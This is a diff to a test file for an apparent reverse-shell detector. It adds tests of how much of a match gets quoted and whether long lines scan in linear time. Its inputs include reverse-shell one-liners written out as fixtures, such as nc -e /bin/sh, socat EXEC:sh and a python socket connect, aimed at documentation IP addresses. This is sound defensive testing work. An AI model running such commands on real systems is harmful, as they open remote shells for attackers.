@@ -1,4 +1,5 @@
 import { expect, test } from "bun:test";
+import { lineShapes, slowdown } from "../../test-timing.ts";
 import { reverseShell } from "./reverse-shell.ts";
 import { shellStatements } from "./shell.ts";
 
@@ -49,4 +50,35 @@ test("a comment drops one level", () => {
 test("split quoting does not hide a command", () => {
   expect(severity("n'c' -e /bin/sh 192.0.2.1 1234")).toBe("critical");
   expect(severity(`"nc"at 192.0.2.1 1234 -c /bin/bash`)).toBe("critical");
+});
+
+test("a match quotes from the command to the last shell it reaches on the line", () => {
+  expect(inScript("echo ok", "socat TCP:192.0.2.1:1 EXEC:sh,pty SYSTEM:id")).toEqual({
+    severity: "critical",
+    line: 2,
+    detail: "socat TCP:192.0.2.1:1 EXEC:sh,pty SYSTEM:",
+  });
+  expect(inScript("nc -zv h 1 | nc h 2 -e /bin/sh -e /bin/bash")?.detail).toBe(
+    "nc h 2 -e /bin/sh -e /bin/bash",
+  );
+  expect(severity("nc db.internal 5432 | grep -e /bin/sh")).toBeUndefined();
+  expect(inScript("python3 -c 'import socket; s.connect((1)); s.connect((2))' # x")?.detail).toBe(
+    "python3 -c 'import socket; s.connect((1)); s.connect(",
+  );
+});
+
+test.each([
+  "python -c socket",
+  "socat",
+  "mkfifo a",
+  "php -r",
+  "nc",
+  "pwsh",
+  "pwsh -e AAAAAAAAAAAAAAAAAAAAAAAA",
+])("a long line of %p scans in linear time", (word) => {
+  const { ratio, rounds } = slowdown(
+    () => inScript(lineShapes(word).oneLine),
+    () => inScript(lineShapes(word).ownLines),
+  );
+  expect(ratio, rounds).toBeLessThan(3);
 });
